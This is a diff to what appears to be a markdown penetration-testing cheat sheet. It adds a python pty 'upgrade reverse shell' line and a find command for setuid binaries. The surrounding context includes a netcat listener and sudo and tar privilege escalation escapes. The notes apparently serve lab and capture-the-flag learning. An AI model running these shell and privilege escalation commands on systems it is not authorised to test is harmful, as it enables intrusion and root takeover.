@@ -369,6 +369,10 @@ If a website allows input or file upload without sanitation it will be possible 
  
 ```nc -nlvp [Your Port]```
 
+#### Upgrade reverse shell
+
+If there is python in the machine ```python -c 'import pty; pty.spawn(\"/bin/bash\")'```
+
 ####  Stabilize reverse shell
 
 1. Inside the shell ```python -c 'import pty; pty.spawn(\"/bin/bash\")'```
@@ -429,6 +433,8 @@ We can do ```find / -name [FILENAME]``` or ```find /* | grep [FILENAME]```
 		- If you see ```(ALL : ALL) ALL```, just call ```sudo bash``` or ```sudo su``` and you will become root.
 	- Other privileges: [Check for exploits](https://gtfobins.github.io/)
 	      - **tar**: ```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
+- Find binaries with elevated privileges
+	- ```find / -perm +6000 2>/dev/null | grep '/bin/'```	
 
 #### Meterpreter
 
